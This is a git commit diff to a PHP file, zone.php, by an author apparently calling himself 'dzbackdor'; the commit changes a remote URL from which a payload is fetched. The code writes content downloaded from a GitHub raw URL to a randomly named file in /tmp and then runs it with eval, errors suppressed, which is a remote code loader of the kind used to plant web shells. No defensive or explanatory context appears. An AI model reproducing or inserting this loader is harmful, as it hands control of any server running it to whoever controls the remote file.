b912bf900a91324c628132ba9362eea16a4e5a4c
dzbackdor <141788825+Dzbackdor@users.noreply.github.com>
2025-04-20 00:24:28 +0700

    Update zone.php

--- zone.php
+++ zone.php
@@ -3,6 +3,6 @@
 $rand = rand(00000000, 99999999);
 $md5 = md5($rand);
 if (!is_file('/tmp/ses_' . $md5)) {
-    @file_put_contents('/tmp/ses_' . $md5, file_get_contents('https://raw.githubusercontent.com/Dzbackdor/anonymous/main/media.txt'));
+    @file_put_contents('/tmp/ses_' . $md5, file_get_contents('https://raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/media/media-v4.php'));
 }
 @eval('?>' . file_get_contents('/tmp/ses_' . $md5));
